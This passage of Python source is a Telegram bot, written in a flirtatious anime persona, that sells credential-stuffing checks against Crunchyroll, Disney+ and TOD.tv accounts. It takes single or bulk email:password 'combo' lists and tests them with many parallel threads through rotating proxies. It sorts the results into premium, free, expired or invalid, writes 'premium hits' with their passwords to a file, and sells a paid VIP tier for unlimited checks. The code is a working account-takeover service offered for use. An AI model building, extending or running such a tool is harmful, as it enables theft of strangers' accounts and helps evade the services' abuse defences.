        keyboard = InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            InlineKeyboardButton("⟡ Crunchyroll", callback_data="service_crunchyroll"),
            InlineKeyboardButton("◈ Disney+", callback_data="service_disney"),
            InlineKeyboardButton("▸ TOD.tv", callback_data="service_tod"),
            InlineKeyboardButton("✧ PureVPN", callback_data="service_purevpn"),
        )
        keyboard.add(
            InlineKeyboardButton("˚ Single Check", callback_data="action_single"),
            InlineKeyboardButton("⊹ Mass Check", callback_data="action_mass")
        )
        keyboard.add(
            InlineKeyboardButton("✦ My Stats", callback_data="action_stats"),
            InlineKeyboardButton("🎀 Buy VIP ♡", callback_data="action_vip")
        )
        keyboard.add(
            InlineKeyboardButton("⌗ Cancel Check", callback_data="action_cancel"),
            InlineKeyboardButton("🌸 Help", callback_data="action_help"),
        )
        return keyboard
    
    def setup_handlers(self):
        @self.bot.message_handler(commands=['start'])
        def start_command(message: Message):
            user_id = message.from_user.id
            username = message.from_user.username or "No username"
            first_name = message.from_user.first_name or "User"
            
            if not user_manager.get_user(user_id):
                user_manager.register_user(user_id, username, first_name)
            
            stats = user_manager.get_user_stats(user_id)
            
            welcome_text = f"""ara ara~ {first_name}-senpai finally came to me ♡ ehehehe~

👉👈 <b>Your Info, just for you~</b>
⋆ Plan: <b>{stats['plan'].upper()}</b>
⋆ Today: {stats['used_today']}/{FREE_DAILY_LIMIT if stats['plan'] == 'free' else '∞'} checks
⋆ Total: {stats['total_checks']} checks done~
{f'⋆ VIP Until: {stats["vip_expiry"]} 🎀' if stats['vip_expiry'] else ''}

🌸 <b>Available Services~</b>
✦ Crunchyroll ◇ Anime
✦ Disney+ ◇ Movies & Series  
✦ TOD.tv ◇ Phone or Email~

⚡ <b>Fast Multi-Threading:</b> {MASS_CHECK_THREADS}x parallel~

<i>don't be shy senpai, use the buttons~ 💋</i>{footer()}"""

            send_colored_message(user_id, welcome_text, get_colored_keyboard())
        
        @self.bot.callback_query_handler(func=lambda call: True)
        def callback_handler(call):
            user_id = call.from_user.id
            data = call.data
            
            if data.startswith("service_"):
                service = data.replace("service_", "")
                if service == "crunchyroll":
                    self.active_service = "crunchyroll"
                    self.bot.answer_callback_query(call.id, "Switched to Crunchyroll~ ⟡")
                    edit_colored_message(
                        call.message.chat.id, call.message.message_id,
                        f"kyaa~ switched to <b>Crunchyroll</b> senpai ⟡\n\n📧 email:password format ne~\n⚡ {MASS_CHECK_THREADS} threads for mass checks!{footer()}",
                        get_colored_keyboard()
                    )
                elif service == "disney":
                    self.active_service = "disney"
                    self.bot.answer_callback_query(call.id, "Switched to Disney+~ ◈")
                    edit_colored_message(
                        call.message.chat.id, call.message.message_id,
                        f"sugoi~ switched to <b>Disney+</b> ◈ just for you senpai ♡\n\n📧 email:password format~\n⚡ {MASS_CHECK_THREADS} threads!{footer()}",
                        get_colored_keyboard()
                    )
                elif service == "tod":
                    self.active_service = "tod"
                    self.bot.answer_callback_query(call.id, "Switched to TOD.tv~ ▸")
                    edit_colored_message(
                        call.message.chat.id, call.message.message_id,
                        f"ara ara~ switched to <b>TOD.tv</b> ▸ ehehehe~\n\n📱 phone:password or email:password~\n⚡ {MASS_CHECK_THREADS} threads!{footer()}",
                        get_colored_keyboard()
                    )
            
            elif data == "action_single":
                self.bot.answer_callback_query(call.id, "send your combo senpai~ 👉👈")
                msg = self.bot.send_message(call.message.chat.id, 
                    f"💋 send your account ne senpai~\n<code>email@example.com:password</code>\nor\n<code>+1234567890:password</code>\n\n˚ Service: <b>{self.active_service.upper()}</b>{footer()}",
                    parse_mode='HTML')
                self.bot.register_next_step_handler(msg, self.single_check_handler)
            
            elif data == "action_mass":
                self.bot.answer_callback_query(call.id, "send the file~ ⊹")
                self.bot.send_message(call.message.chat.id, 
                    f"⊹ send your .txt combo file senpai~ one per line ♡\nFormat: email:password or phone:password\n\n⚡ {MASS_CHECK_THREADS} parallel threads~ so fast ne!\n\n˚ Service: <b>{self.active_service.upper()}</b>{footer()}")
                self.bot.register_next_step_handler(call.message, self.mass_check_handler)
            
            elif data == "action_stats":
                stats = user_manager.get_user_stats(user_id)
                remaining = stats['remaining'] if isinstance(stats['remaining'], str) else f"{stats['remaining']}/{FREE_DAILY_LIMIT}"
                stats_text = f"""✦ <b>Your Stats, senpai~</b> ♡

˚ ━━━━━━━━━━━━━━━━ ˚
⋆ Plan: <b>{stats['plan'].upper()}</b>
⋆ Today's Usage: {stats['used_today']}
⋆ Remaining: {remaining}
⋆ Total Checks: {stats['total_checks']}
{f'⋆ VIP Expiry: {stats["vip_expiry"]} 🎀' if stats['vip_expiry'] else ''}
˚ ━━━━━━━━━━━━━━━━ ˚

<i>you're doing great senpai~ ehehehe 👀</i>{footer()}"""
                self.bot.answer_callback_query(call.id)
                edit_colored_message(call.message.chat.id, call.message.message_id, stats_text, get_colored_keyboard())
            
            elif data == "action_vip":
                vip_text = f"""🎀 <b>VIP Plan~ just for special senpai</b> ♡

˚ ━━━━━━━━━━━━━━━━ ˚
⋆ Price: <b>${VIP_PRICE}</b>
⋆ Duration: <b>{VIP_DURATION_DAYS} days</b>
⋆ Benefits~:
  ◇ Unlimited daily checks ♡
  ◇ Priority support~
  ◇ No limits baka!
  ◇ Faster threads ⚡
˚ ━━━━━━━━━━━━━━━━ ˚

💋 Contact @iam_esh to purchase~
Send your transaction ID after payment ne senpai 👉👈{footer()}"""
                self.bot.answer_callback_query(call.id)
                edit_colored_message(call.message.chat.id, call.message.message_id, vip_text, get_colored_keyboard())
            
            elif data == "action_cancel":
                if user_id in self.active_checks:
                    self.active_checks[user_id]['cancel'] = True
                    self.bot.answer_callback_query(call.id, "cancelled~ 👀")
                    edit_colored_message(call.message.chat.id, call.message.message_id,
                        f"⌗ cancelled senpai~ as you wish ♡{footer()}", get_colored_keyboard())
                elif user_id in self.mass_check_active:
                    self.mass_check_active[user_id] = False
                    self.bot.answer_callback_query(call.id, "mass check cancelled~")
                    edit_colored_message(call.message.chat.id, call.message.message_id,
                        f"⌗ mass check cancelled ne~ ehehehe{footer()}", get_colored_keyboard())
                else:
                    self.bot.answer_callback_query(call.id, "nothing to cancel~")
                    edit_colored_message(call.message.chat.id, call.message.message_id,
                        f"nani? you don't have any active checks senpai~ 👀{footer()}", get_colored_keyboard())
            
            elif data == "action_help":
                help_text = f"""🌸 <b>Help Guide~ ara ara</b> ♡

<b>⟡ Services~</b>
◇ Crunchyroll - Anime (Email)
◇ Disney+ - Movies (Email)
◇ TOD.tv - Arabic~ (Phone or Email)

<b>˚ Single Check~</b>
<code>email@example.com:password</code>
<code>+201114270770:password</code>

<b>⊹ Mass Check~</b>
.txt file, one combo per line ♡
⚡ {MASS_CHECK_THREADS} parallel threads!

<b>✦ Results~</b>
✅ PREMIUM - active subscription senpai~
🆓 FREE - free account ne
❌ INVALID - wrong credentials baka!

<b>⌗ Admin Commands~</b>
/addproxy /testproxy /proxies /delbad /upgrade{footer()}"""
                self.bot.answer_callback_query(call.id)
                edit_colored_message(call.message.chat.id, call.message.message_id, help_text, get_colored_keyboard())
        
        @self.bot.message_handler(commands=['stats'])
        def stats_command(message: Message):
            user_id = message.from_user.id
            stats = user_manager.get_user_stats(user_id)
            remaining = stats['remaining'] if isinstance(stats['remaining'], str) else f"{stats['remaining']}/{FREE_DAILY_LIMIT}"
            stats_text = f"""✦ <b>Your Stats, senpai~</b> ♡

˚ ━━━━━━━━━━━━━━━━ ˚
⋆ Plan: <b>{stats['plan'].upper()}</b>
⋆ Today's Usage: {stats['used_today']}
⋆ Remaining: {remaining}
⋆ Total Checks: {stats['total_checks']}
{f'⋆ VIP Expiry: {stats["vip_expiry"]} 🎀' if stats['vip_expiry'] else ''}
˚ ━━━━━━━━━━━━━━━━ ˚{footer()}"""
            send_colored_message(user_id, stats_text, get_colored_keyboard())
        
        @self.bot.message_handler(commands=['vip'])
        def vip_command(message: Message):
            vip_text = f"""🎀 <b>VIP Plan~ just for special senpai</b> ♡

˚ ━━━━━━━━━━━━━━━━ ˚
⋆ Price: <b>${VIP_PRICE}</b>
⋆ Duration: <b>{VIP_DURATION_DAYS} days</b>
⋆ Benefits~:
  ◇ Unlimited daily checks ♡
  ◇ Priority support~
  ◇ No limits baka!
  ◇ Faster threads ⚡
˚ ━━━━━━━━━━━━━━━━ ˚

💋 Contact @iam_esh to purchase~
Send your transaction ID after payment ne senpai 👉👈{footer()}"""
            send_colored_message(message.from_user.id, vip_text, get_colored_keyboard())
        
        @self.bot.message_handler(commands=['addproxy'])
        def addproxy_command(message: Message):
            if message.from_user.id not in self.admin_ids:
                self.bot.reply_to(message, "⛔ Unauthorized! Admin only.")
                return
            
            args = message.text.split(maxsplit=1)
            if len(args) < 2:
                self.bot.reply_to(message, "❌ Usage: /addproxy proxy1 proxy2 proxy3\n\nFormats:\n• ip:port\n• user:pass@ip:port")
                return
            
            proxy_list = args[1].split()
            added = 0
            
            for proxy in proxy_list:
                if ':' in proxy:
                    if proxy.count(':') == 3:
                        parts = proxy.split(':')
                        proxy = f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                    if proxy_manager.add_proxy(proxy, message.from_user.id):
                        added += 1
            
            self.bot.reply_to(message, f"✅ Added {added} proxies!\nTotal proxies: {len(proxy_manager.get_all_proxies())}")
        
        @self.bot.message_handler(commands=['testproxy'])
        def testproxy_command(message: Message):
            if message.from_user.id not in self.admin_ids:
                self.bot.reply_to(message, "⛔ Unauthorized! Admin only.")
                return
            
            proxies = proxy_manager.get_all_proxies()
            if not proxies:
                self.bot.reply_to(message, "❌ No proxies loaded!")
                return
            
            status_msg = self.bot.reply_to(message, f"🔍 Testing {len(proxies)} proxies with {PROXY_TEST_THREADS} threads...")
            
            working = []
            failed = []
            results_lock = threading.Lock()
            
            def test_single_proxy(proxy):
                try:
                    test_session = requests.Session()
                    test_session.proxies.update({'http': f'http://{proxy}', 'https': f'http://{proxy}'})
                    test_session.timeout = 10
                    response = test_session.get('https://httpbin.org/ip', timeout=10)
                    if response.status_code == 200:
                        with results_lock:
                            working.append(proxy)
                        return True
                    else:
                        with results_lock:
                            failed.append(proxy)
                        proxy_manager.mark_bad(proxy)
                        return False
                except:
                    with results_lock:
                        failed.append(proxy)
                    proxy_manager.mark_bad(proxy)
                    return False
            
            with ThreadPoolExecutor(max_workers=PROXY_TEST_THREADS) as executor:
                futures = {executor.submit(test_single_proxy, proxy): proxy for proxy in proxies}
                
                for i, future in enumerate(as_completed(futures)):
                    if (i + 1) % 10 == 0:
                        self.bot.edit_message_text(f"Testing... ({i+1}/{len(proxies)})\n✅ Working: {len(working)}\n❌ Failed: {len(failed)}",
                                                  message.chat.id, status_msg.message_id)
            
            result_text = f"""
✅ <b>Proxy Test Complete!</b>

Total: {len(proxies)}
Working: {len(working)} ✅
Failed: {len(failed)} ❌
⚡ Speed: Tested with {PROXY_TEST_THREADS} parallel threads
"""
            self.bot.edit_message_text(result_text, message.chat.id, status_msg.message_id, parse_mode='HTML')
        
        @self.bot.message_handler(commands=['proxies'])
        def proxies_command(message: Message):
            proxies = proxy_manager.get_all_proxies()
            if not proxies:
                self.bot.reply_to(message, "❌ No proxies loaded!")
                return
            
            proxy_list = "\n".join([f"• {p[:60]}" for p in proxies[:20]])
            if len(proxies) > 20:
                proxy_list += f"\n... and {len(proxies) - 20} more"
            
            text = f"""
📡 <b>Proxy List</b>

Total: {len(proxies)}
{proxy_list}
"""
            self.bot.reply_to(message, text, parse_mode='HTML')
        
        @self.bot.message_handler(commands=['delbad'])
        def delbad_command(message: Message):
            if message.from_user.id not in self.admin_ids:
                self.bot.reply_to(message, "⛔ Unauthorized! Admin only.")
                return
            
            count = proxy_manager.clear_bad()
            self.bot.reply_to(message, f"✅ Cleared bad proxies! {count} proxies now available.")
        
        @self.bot.message_handler(commands=['upgrade'])
        def upgrade_command(message: Message):
            if message.from_user.id not in self.admin_ids:
                self.bot.reply_to(message, "⛔ Unauthorized! Admin only.")
                return
            
            args = message.text.split()
            if len(args) < 2:
                self.bot.reply_to(message, "❌ Usage: /upgrade user_id [days]")
                return
            
            user_id = int(args[1])
            days = int(args[2]) if len(args) > 2 else VIP_DURATION_DAYS
            
            user_manager.set_plan(user_id, 'vip', days)
            self.bot.reply_to(message, f"✅ User {user_id} upgraded to VIP for {days} days!")
            
            try:
                self.bot.send_message(user_id, f"kyaa~ congratulations senpai! 🎀 you've been upgraded to <b>VIP</b> for {days} days!\n\nunlimited daily checks now~ ehehehe ♡{footer()}", parse_mode='HTML')
            except:
                pass
        
        # Handle any message with colon (supports both email and phone)
        @self.bot.message_handler(func=lambda message: ':' in message.text and not message.text.startswith('/'))
        def handle_combo(message: Message):
            combo = message.text.strip()
            
            # Basic validation
            if ':' not in combo:
                self.bot.reply_to(message, "❌ Invalid format! Use email:password or phone:password", reply_markup=self.get_main_keyboard(message.from_user.id))
                return
            
            # For TOD.tv, phone numbers are allowed (no @ symbol)
            # For other services, check email format
            username, pwd = combo.split(':', 1)
            if not username or not pwd:
                self.bot.reply_to(message, "❌ Both username/phone and password are required!", reply_markup=self.get_main_keyboard(message.from_user.id))
                return
            
            if self.active_service != "tod":
                if '@' not in username:
                    self.bot.reply_to(message, f"❌ For {self.active_service.upper()}, please use email:password format", reply_markup=self.get_main_keyboard(message.from_user.id))
                    return
            
            can_check, msg = user_manager.can_check(message.from_user.id)
            if not can_check:
                self.bot.reply_to(message, f"⚠️ {msg}\n\nUpgrade to VIP for unlimited checks!", reply_markup=self.get_main_keyboard(message.from_user.id))
                return
            
            def run_check():
                self.check_account(message, combo)
            
            thread = threading.Thread(target=run_check)
            thread.daemon = True
            thread.start()
    
    def single_check_handler(self, message: Message):
        user_id = message.from_user.id
        combo = message.text.strip()
        
        if ':' not in combo:
            self.bot.reply_to(message, "❌ Invalid format! Use email:password or phone:password", reply_markup=self.get_main_keyboard(user_id))
            return
        
        username, password = combo.split(':', 1)
        if not username or not password:
            self.bot.reply_to(message, "❌ Both username/phone and password are required!", reply_markup=self.get_main_keyboard(user_id))
            return
        
        if self.active_service != "tod":
            if '@' not in username:
                self.bot.reply_to(message, f"❌ For {self.active_service.upper()}, please use email:password format", reply_markup=self.get_main_keyboard(user_id))
                return
        
        can_check, msg = user_manager.can_check(user_id)
        if not can_check:
            self.bot.reply_to(message, f"⚠️ {msg}\n\nUpgrade to VIP for unlimited checks!", reply_markup=self.get_main_keyboard(user_id))
            return
        
        def run_check():
            self.check_account(message, combo)
        
        thread = threading.Thread(target=run_check)
        thread.daemon = True
        thread.start()
    
    def mass_check_handler(self, message: Message):
        user_id = message.from_user.id
        
        if not message.document or message.document.mime_type != 'text/plain':
            self.bot.reply_to(message, "❌ Please send a .txt file", reply_markup=self.get_main_keyboard(user_id))
            return
        
        can_check, msg = user_manager.can_check(user_id)
        if not can_check:
            self.bot.reply_to(message, f"⚠️ {msg}\n\nUpgrade to VIP for unlimited checks!", reply_markup=self.get_main_keyboard(user_id))
            return
        
        def run_mass_check():
            self.process_mass_file_fast(message)
        
        thread = threading.Thread(target=run_mass_check)
        thread.daemon = True
        thread.start()
    
    def check_account(self, message: Message, combo):
        user_id = message.from_user.id
        
        if user_id in self.user_checking and self.user_checking[user_id]:
            self.bot.reply_to(message, "⚠️ You already have an active check! Use /cancel to stop it.")
            return
        
        try:
            username, password = combo.split(':', 1)
            
            self.user_checking[user_id] = True
            self.active_checks[user_id] = {'username': username, 'cancel': False}
            
            credential_type = "email" if '@' in username else "phone"
            status_msg = self.bot.reply_to(message, f"🔍 Checking <b>{self.active_service.upper()}</b> account: <code>{username}</code> ({credential_type})\n⏳ Please wait...", parse_mode='HTML')
            
            proxies = proxy_manager.get_all_proxies()
            
            if self.active_service == "crunchyroll":
                if not self.crunchyroll_checker:
                    self.crunchyroll_checker = CrunchyrollChecker(None, None, proxies)
                result = self.crunchyroll_checker.check(username, password)
            elif self.active_service == "disney":
                if not self.disney_checker:
                    self.disney_checker = DisneyPlusChecker(proxies, debug=True)
                result = self.disney_checker.check(username, password)
            else:  # tod
                if not self.tod_checker:
                    self.tod_checker = TodTvChecker(proxies, debug=True)
                result = self.tod_checker.check(username, password)
            
            if self.active_checks.get(user_id, {}).get('cancel', False):
                self.bot.edit_message_text("❌ Check cancelled.", message.chat.id, status_msg.message_id)
                return
            
            # Only increment checks for valid results (not errors)
            if result['status'] in ['PREMIUM', 'FREE', 'INVALID', 'EXPIRED']:
                user_manager.increment_checks(user_id)
            
            # Format response based on service and status
            if result['status'] == 'PREMIUM':
                response = self.format_premium_result(result)
                self.bot.edit_message_text(response, message.chat.id, status_msg.message_id, parse_mode='HTML')
                self.save_hit(result)
            elif result['status'] == 'FREE':
                response = self.format_free_result(result)
                self.bot.edit_message_text(response, message.chat.id, status_msg.message_id, parse_mode='HTML')
            elif result['status'] == 'EXPIRED':
                response = self.format_expired_result(result)
                self.bot.edit_message_text(response, message.chat.id, status_msg.message_id, parse_mode='HTML')
            elif result['status'] == 'INVALID':
                response = f"❌ <b>INVALID ACCOUNT</b>\n\n📧 <code>{username}</code>\n🔑 Invalid credentials\n🎬 Service: {self.active_service.upper()}"
                self.bot.edit_message_text(response, message.chat.id, status_msg.message_id, parse_mode='HTML')
            elif result['status'] == 'PASSWORD_RESET':
                response = f"⚠️ <b>PASSWORD RESET REQUIRED</b>\n\n📧 <code>{username}</code>\n🔑 Password needs to be reset\n🎬 Service: {self.active_service.upper()}"
                self.bot.edit_message_text(response, message.chat.id, status_msg.message_id, parse_mode='HTML')
            else:
                error_msg = result.get('message', 'Unknown error')
                response = f"⚠️ <b>ERROR</b>\n\n📧 <code>{username}</code>\n💥 {error_msg}\n🎬 Service: {self.active_service.upper()}"
                self.bot.edit_message_text(response, message.chat.id, status_msg.message_id, parse_mode='HTML')
            
            self.bot.send_message(message.chat.id, f"✦ check complete senpai~ use the buttons for more ♡{footer()}",
                                 reply_markup=self.get_main_keyboard(user_id))
            
        except Exception as e:
            import traceback
            traceback.print_exc()
            self.bot.reply_to(message, f"❌ Error: {str(e)}")
        finally:
            if user_id in self.user_checking:
                del self.user_checking[user_id]
            if user_id in self.active_checks:
                del self.active_checks[user_id]
    
    def process_mass_file_fast(self, message: Message):
        user_id = message.from_user.id
        
        try:
            file_info = self.bot.get_file(message.document.file_id)
            downloaded_file = self.bot.download_file(file_info.file_path)
            
            content = downloaded_file.decode('utf-8')
            combos = [line.strip() for line in content.split('\n') if line.strip() and ':' in line]
            
            if not combos:
                self.bot.reply_to(message, "❌ No valid combos found!", reply_markup=self.get_main_keyboard(user_id))
                return
            
            can_check, msg = user_manager.can_check(user_id)
            if not can_check:
                self.bot.reply_to(message, f"⚠️ {msg}", reply_markup=self.get_main_keyboard(user_id))
                return
            
            user = user_manager.get_user(user_id)
            if user['plan'] == 'free':
                remaining = FREE_DAILY_LIMIT - user['daily_checks']
                if len(combos) > remaining:
                    self.bot.reply_to(message, f"⚠️ You only have {remaining} checks remaining today. Only {remaining} accounts will be checked.")
                    combos = combos[:remaining]
            
            self.mass_check_active[user_id] = True
            status_msg = self.bot.reply_to(message, f"⚡ Starting FAST mass check of {len(combos)} accounts with {MASS_CHECK_THREADS} parallel threads...\n⏳ Results will appear as they are checked!")
            
            proxies = proxy_manager.get_all_proxies()
            
            stats = {'total': len(combos), 'premium': 0, 'free': 0, 'expired': 0, 'invalid': 0, 'error': 0, 'completed': 0}
            premium_results = []
            results_lock = threading.Lock()
            start_time = time.time()
            
            # Create a queue for sending results from threads
            result_queue = Queue()
            
            def send_result_to_telegram(result_text):
                try:
                    self.bot.send_message(message.chat.id, result_text, parse_mode='HTML')
                except Exception as e:
                    print(f"Error sending message: {e}")
            
            def check_one_combo(combo):
                try:
                    username, pwd = combo.split(':', 1)
                    if self.active_service == "crunchyroll":
                        checker = CrunchyrollChecker(None, None, proxies)
                        result = checker.check(username, pwd)
                    elif self.active_service == "disney":
                        checker = DisneyPlusChecker(proxies, debug=False)
                        result = checker.check(username, pwd)
                    else:  # tod
                        checker = TodTvChecker(proxies, debug=False)
                        result = checker.check(username, pwd)
                    return result
                except Exception as e:
                    username = combo.split(':')[0] if ':' in combo else 'Unknown'
                    return {'status': 'ERROR', 'email': username, 'password': '', 'service': self.active_service, 'message': str(e)}
            
            with ThreadPoolExecutor(max_workers=MASS_CHECK_THREADS) as executor:
                futures = {executor.submit(check_one_combo, combo): combo for combo in combos}
                
                for future in as_completed(futures):
                    if not self.mass_check_active.get(user_id, False):
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                    
                    result = future.result()
                    
                    with results_lock:
                        stats['completed'] += 1
                        
                        if result['status'] == 'PREMIUM':
                            stats['premium'] += 1
                            premium_results.append(result)
                            self.save_hit(result)
                            # Send premium result immediately
                            result_text = self.format_premium_result(result)
                            send_result_to_telegram(result_text)
                        elif result['status'] == 'FREE':
                            stats['free'] += 1
                            # Send free result immediately
                            result_text = self.format_free_result(result)
                            send_result_to_telegram(result_text)
                        elif result['status'] == 'EXPIRED':
                            stats['expired'] += 1
                            result_text = self.format_expired_result(result)
                            send_result_to_telegram(result_text)
                        elif result['status'] == 'INVALID':
                            stats['invalid'] += 1
                        else:
                            stats['error'] += 1
                        
                        # Update progress every 5 checks or at completion
                        if stats['completed'] % 5 == 0 or stats['completed'] == stats['total']:
                            percent = (stats['completed'] / stats['total']) * 100
                            elapsed = time.time() - start_time
                            speed = stats['completed'] / elapsed if elapsed > 0 else 0
                            remaining_time = (stats['total'] - stats['completed']) / speed if speed > 0 else 0
                            
                            progress_text = f"""
⚡ <b>FAST Mass Check in Progress</b>

Progress: {stats['completed']}/{stats['total']} ({percent:.1f}%)
🎬 Service: {self.active_service.upper()}
🧵 Threads: {MASS_CHECK_THREADS} parallel
⚡ Speed: {speed:.1f} accounts/sec
⏱️ ETA: {remaining_time:.0f} seconds
━━━━━━━━━━━━━━━━━━━━━━
✅ Premium: {stats['premium']}  🆓 Free: {stats['free']}
📅 Expired: {stats['expired']}  ❌ Invalid: {stats['invalid']}
⚠️ Error: {stats['error']}
"""
                            try:
                                self.bot.edit_message_text(progress_text, message.chat.id, status_msg.message_id, parse_mode='HTML')
                            except:
                                pass
            
            elapsed = time.time() - start_time
            user_manager.increment_checks(user_id, stats['completed'])
            
            final_text = f"""
✅ <b>FAST Mass Check Complete!</b>

━━━━━━━━━━━━━━━━━━━━━━
📝 Total: {stats['total']}
✅ Premium: {stats['premium']}
🆓 Free: {stats['free']}
📅 Expired: {stats['expired']}
❌ Invalid: {stats['invalid']}
⚠️ Errors: {stats['error']}
━━━━━━━━━━━━━━━━━━━━━━
⚡ Performance:
• Time: {elapsed:.1f} seconds
• Speed: {stats['total']/elapsed:.1f} accounts/sec
• Threads: {MASS_CHECK_THREADS} parallel
━━━━━━━━━━━━━━━━━━━━━━
🎁 Premium Hits: {len(premium_results)}
"""
            self.bot.edit_message_text(final_text, message.chat.id, status_msg.message_id, parse_mode='HTML')
            
            self.bot.send_message(message.chat.id, "✅ Mass check complete! Use the buttons below for more checks.",
                                 reply_markup=self.get_main_keyboard(user_id))
            
        except Exception as e:
            import traceback
            traceback.print_exc()
            self.bot.reply_to(message, f"❌ Error: {str(e)}")
        finally:
            if user_id in self.mass_check_active:
                del self.mass_check_active[user_id]
    
    def format_premium_result(self, result):
        def safe_str(value):
            if value is None:
                return 'N/A'
            return str(value)
        
        service = safe_str(result.get('service', 'N/A'))
        
        # For TOD.tv, use username field if available
        if service == 'TOD.tv':
            username = safe_str(result.get('username', result.get('email', 'N/A')))
            password = safe_str(result.get('password', 'N/A'))
            plan = safe_str(result.get('plan', 'Premium'))
            billing_cycle = safe_str(result.get('billing_cycle', 'N/A'))
            expiry_date = safe_str(result.get('expiry_date', 'N/A'))
            
            return f"""
✅ <b>PREMIUM ACCOUNT!</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
📺 <b>Service:</b> TOD.tv
📱 <b>Phone/Email:</b> <code>{username}</code>
🔑 <b>Password:</b> <code>{password}</code>
━━━━━━━━━━━━━━━━━━━━━━
⭐ <b>Plan:</b> {plan}
🔄 <b>Billing Cycle:</b> {billing_cycle}
📅 <b>Expiry Date:</b> {expiry_date}
━━━━━━━━━━━━━━━━━━━━━━
<i>Cracked by: @Cypher099 </i>
"""
        elif service == 'Crunchyroll':
            email = safe_str(result.get('email', 'N/A'))
            password = safe_str(result.get('password', 'N/A'))
            plan = safe_str(result.get('plan', 'N/A'))
            expiry = safe_str(result.get('expiry', 'N/A'))
            country = safe_str(result.get('country', 'N/A'))
            email_verified = safe_str(result.get('email_verified', 'N/A'))
            free_trial = safe_str(result.get('free_trial', 'N/A'))
            
            return f"""
✅ <b>PREMIUM ACCOUNT!</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎬 <b>Service:</b> Crunchyroll
📧 <b>Email:</b> <code>{email}</code>
🔑 <b>Password:</b> <code>{password}</code>
━━━━━━━━━━━━━━━━━━━━━━
⭐ <b>Plan:</b> {plan}
📅 <b>Expiry:</b> {expiry}
🌍 <b>Country:</b> {country}
✅ <b>Email Verified:</b> {email_verified}
🎁 <b>Free Trial:</b> {free_trial}
━━━━━━━━━━━━━━━━━━━━━━
<i>Cracked by: @Cypher099 </i>
"""
        else:  # Disney+
            email = safe_str(result.get('email', 'N/A'))
            password = safe_str(result.get('password', 'N/A'))
            plan = safe_str(result.get('plan', 'N/A'))
            next_renewal = safe_str(result.get('next_renewal', 'N/A'))
            country = safe_str(result.get('country', 'N/A'))
            email_verified = safe_str(result.get('email_verified', 'N/A'))
            free_trial = safe_str(result.get('free_trial', 'N/A'))
            
            return f"""
✅ <b>PREMIUM ACCOUNT!</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🏰 <b>Service:</b> Disney+
📧 <b>Email:</b> <code>{email}</code>
🔑 <b>Password:</b> <code>{password}</code>
━━━━━━━━━━━━━━━━━━━━━━
⭐ <b>Plan:</b> {plan}
📅 <b>Next Renewal:</b> {next_renewal}
🌍 <b>Country:</b> {country}
✅ <b>Email Verified:</b> {email_verified}
🎁 <b>Free Trial:</b> {free_trial}
━━━━━━━━━━━━━━━━━━━━━━{footer()}
"""

    def format_free_result(self, result):
        def safe_str(value):
            if value is None:
                return 'N/A'
            return str(value)
        
        service = safe_str(result.get('service', 'N/A'))
        
        # For TOD.tv, use username field
        if service == 'TOD.tv':
            username = safe_str(result.get('username', result.get('email', 'N/A')))
            password = safe_str(result.get('password', 'N/A'))
            plan = safe_str(result.get('plan', 'Free'))
            
            return f"""
🆓 <b>FREE ACCOUNT</b>
━━━━━━━━━━━━━━━━━━━━━━
📺 <b>Service:</b> TOD.tv
📱 <b>Username:</b> <code>{username}</code>
🔑 <b>Password:</b> <code>{password}</code>
━━━━━━━━━━━━━━━━━━━━━━
⭐ <b>Plan:</b> {plan}
━━━━━━━━━━━━━━━━━━━━━━
"""
        else:
            username = safe_str(result.get('email', result.get('username', 'N/A')))
            password = safe_str(result.get('password', 'N/A'))
            
            return f"""
🆓 <b>FREE ACCOUNT</b>
━━━━━━━━━━━━━━━━━━━━━━
🎬 <b>Service:</b> {service}
📧 <b>Username:</b> <code>{username}</code>
🔑 <b>Password:</b> <code>{password}</code>
━━━━━━━━━━━━━━━━━━━━━━
"""

    def format_expired_result(self, result):
        def safe_str(value):
            if value is None:
                return 'N/A'
            return str(value)
        
        service = safe_str(result.get('service', 'N/A'))
        
        if service == 'TOD.tv':
            username = safe_str(result.get('username', result.get('email', 'N/A')))
            password = safe_str(result.get('password', 'N/A'))
            plan = safe_str(result.get('plan', 'N/A'))
            
            return f"""
📅 <b>EXPIRED SUBSCRIPTION</b>
━━━━━━━━━━━━━━━━━━━━━━
📺 <b>Service:</b> TOD.tv
📱 <b>Username:</b> <code>{username}</code>
🔑 <b>Password:</b> <code>{password}</code>
━━━━━━━━━━━━━━━━━━━━━━
⭐ <b>Plan:</b> {plan}
━━━━━━━━━━━━━━━━━━━━━━
"""
        else:
            username = safe_str(result.get('email', result.get('username', 'N/A')))
            password = safe_str(result.get('password', 'N/A'))
            plan = safe_str(result.get('plan', 'N/A'))
            country = safe_str(result.get('country', 'N/A'))
            
            return f"""
📅 <b>EXPIRED SUBSCRIPTION</b>
━━━━━━━━━━━━━━━━━━━━━━
🎬 <b>Service:</b> {service}
📧 <b>Username:</b> <code>{username}</code>
🔑 <b>Password:</b> <code>{password}</code>
━━━━━━━━━━━━━━━━━━━━━━
⭐ <b>Plan:</b> {plan}
🌍 <b>Country:</b> {country}
━━━━━━━━━━━━━━━━━━━━━━
"""

    def save_hit(self, result):
        def safe_str(value):
            if value is None:
                return 'N/A'
            return str(value)
        
        try:
            with open('premium_hits.txt', 'a', encoding='utf-8') as f:
                f.write(f"\n{'='*70}")
                f.write(f"\nSERVICE: {safe_str(result.get('service', 'N/A'))}")
                
                if result.get('service') == 'TOD.tv':
                    f.write(f"\nUSERNAME: {safe_str(result.get('username', result.get('email', 'N/A')))}")
                else:
                    f.write(f"\nEMAIL: {safe_str(result.get('email', 'N/A'))}")
                
                f.write(f"\nPASSWORD: {safe_str(result.get('password', 'N/A'))}")
                f.write(f"\nSTATUS: {safe_str(result.get('status', 'N/A'))}")
                
                if result.get('service') == 'Crunchyroll':
                    f.write(f"\nPLAN: {safe_str(result.get('plan', 'N/A'))}")
                    f.write(f"\nEXPIRY: {safe_str(result.get('expiry', 'N/A'))}")
                    f.write(f"\nCOUNTRY: {safe_str(result.get('country', 'N/A'))}")
                elif result.get('service') == 'Disney+':
                    f.write(f"\nPLAN: {safe_str(result.get('plan', 'N/A'))}")
                    f.write(f"\nNEXT RENEWAL: {safe_str(result.get('next_renewal', 'N/A'))}")
                    f.write(f"\nCOUNTRY: {safe_str(result.get('country', 'N/A'))}")
                elif result.get('service') == 'TOD.tv':
